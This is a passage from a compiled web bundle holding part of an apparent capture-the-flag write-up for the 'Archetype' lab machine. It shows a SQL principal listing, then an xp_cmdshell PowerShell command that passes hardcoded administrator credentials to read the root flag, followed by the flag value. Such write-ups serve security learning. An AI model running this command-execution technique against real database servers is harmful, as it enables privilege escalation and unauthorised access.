TLS\n[-] ERROR(ARCHETYPE): Line 1: Login failed for user 'ARCHETYPE\\administrator'.\n"})}),"\n",(0,s.jsxs)(n.p,{children:["This is because there\u2019s no such user in the database (logged in with ",(0,s.jsx)(n.code,{children:"sql_svc"})," user):"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-sql",children:"SQL> SELECT name FROM sys.database_principals\n\nname\n \npublic\ndbo\nguest\nINFORMATION_SCHEMA\nsys\n##MS_PolicyEventProcessingLogin##\n##MS_AgentSigningCertificate##\ndb_owner\ndb_accessadmin\ndb_securityadmin \ndb_ddladmin\ndb_backupoperator\ndb_datareader\ndb_datawriter\ndb_denydatareader\ndb_denydatawriter                               \n"})}),"\n",(0,s.jsxs)(n.p,{children:["So I needed to try the latter approach: run the command to read the flag as administrator.\nI did some research and found ",(0,s.jsx)(n.a,{href:"https://superuser.com/a/1421775/506517",children:"a way to do this using PowerShell"}),". I ran the following command to specify the administrator credentials and print the contents of the flag:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-sql",children:'SQL> xp_cmdshell "powershell "$username=\\"administrator\\";$password=\\"MEGACORP_4dm1n!!\\";$pass = ConvertTo-SecureString -AsPlainText $Password -Force;$Cred = New-Object System.Management.Automation.PSCredential -ArgumentList $Username,$pass;Invoke-Command -ComputerName \\"Archetype\\" -Credential $Cred -ScriptBlock {Get-Content C:\\Users\\Administrator\\Desktop\\root.txt} ""\n\noutput                                                                             \n \nb91ccec3305e98240082d4474b848528\n'})})]})}function d(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(h,{...e})}):h(e)}},28453:(e,n,t)=>{t.d(n,{R:()=>o,x:()=>r});var s=t(96540);const i={},a=s.createContext(i);function o(e){const n=s.useContext(a);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function r(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:o(e.components),s.createElement(a.Provider,{value:n},e.children)}}}]);